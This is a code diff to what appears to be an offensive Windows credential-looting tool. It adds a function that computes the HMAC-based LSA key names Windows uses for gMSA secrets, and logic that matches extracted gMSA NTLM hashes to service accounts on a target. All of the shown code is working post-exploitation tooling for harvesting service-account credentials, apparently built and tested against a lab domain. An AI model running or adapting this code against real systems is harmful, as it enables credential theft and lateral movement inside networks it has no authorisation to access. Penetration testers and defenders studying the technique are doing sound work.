@@ -670,17 +670,56 @@ def perform_lsa_service_looting(
     return out_lines
 
 
+def _compute_gmsa_hmac(domain_netbios: str, account: str) -> Optional[str]:
+    """Compute the HMAC-SHA256 used in _SC_GMSA_ LSA key names.
+
+    Windows computes: HMAC-SHA256(key=empty, msg=UTF16LE(UPPER(netbios_domain + account_without_$)))
+    The resulting hex is nibble-swapped (low nibble first, then high).
+
+    Reference: https://aadinternals.com/post/gmsa/
+    """
+    import hashlib
+    import hmac as hmac_mod
+
+    try:
+        # Strip $ suffix and use NetBIOS domain name (not FQDN)
+        clean_account = account.rstrip("$")
+        gmsa_name = (domain_netbios + clean_account).upper()
+        bin_hash = hmac_mod.new(
+            bytes("", "latin-1"),
+            msg=gmsa_name.encode("utf-16le"),
+            digestmod=hashlib.sha256,
+        ).digest()
+
+        # Nibble-swapped hex encoding (Windows convention)
+        hex_letters = "0123456789abcdef"
+        result = ""
+        for b in bin_hash:
+            result += hex_letters[b & 0x0F]
+            result += hex_letters[b >> 0x04]
+        return result
+    except Exception:
+        return None
+
+
 def _map_lsa_creds_to_service_rows(
     service_rows: List[Any],
     credentials: List[Any],
     target: str,
+    gmsa_credentials: Optional[List[Any]] = None,
+    domain: Optional[str] = None,
 ) -> None:
     """Map already-extracted LSA credentials to service rows (in-place).
 
     Used when LSA extraction was already performed earlier in process_target
     (for DPAPI key extraction). Avoids a second LSA extraction pass.
+
+    Also maps gMSA NTLM hashes to gMSA service rows by computing the
+    HMAC-SHA256 of the account name and matching against extracted IDs.
     """
     matched = 0
+
+    # Map regular service credentials
     for cred in credentials:
         for row in service_rows:
             if row.is_gmsa:
@@ -697,8 +736,43 @@ def _map_lsa_creds_to_service_rows(
                     matched += 1
                     break
 
+    # Map gMSA NTLM hashes by computing HMAC from account name
+    gmsa_matched = 0
+    if gmsa_credentials and domain:
+        # Derive NetBIOS domain name from FQDN (first component)
+        # e.g., "ludus.domain" -> "LUDUS"
+        netbios = domain.split(".")[0].upper() if "." in domain else domain.upper()
+
+        for row in service_rows:
+            if not row.is_gmsa or not row.start_name:
+                continue
+
+            # Extract the account name (DOMAIN\account$ or just account$)
+            if "\\" in row.start_name:
+                # Use the prefix from the service account for NetBIOS if available
+                row_netbios = row.start_name.split("\\")[0].upper()
+                account = row.start_name.split("\\")[1]
+            else:
+                row_netbios = netbios
+                account = row.start_name
+
+            # Compute HMAC for this account (uses NetBIOS domain, strips $)
+            expected_hmac = _compute_gmsa_hmac(row_netbios, account)
+            if not expected_hmac:
+                continue
+
+            # Match against extracted gMSA credentials
+            for gmsa_cred in gmsa_credentials:
+                if gmsa_cred.gmsa_id == expected_hmac:
+                    row.decrypted_password = f"NTLM:{gmsa_cred.ntlm_hash}"
+                    row.reason = "[gMSA] NTLM hash extracted from LSA secrets"
+                    gmsa_matched += 1
+                    break
+
     if matched:
         good(f"{target}: Matched {matched} LSA credential(s) to service accounts")
+    if gmsa_matched:
+        good(f"{target}: Matched {gmsa_matched} gMSA NTLM hash(es) to service accounts")
 
 
 def sort_tasks_by_priority(lines: List[str]) -> List[str]:
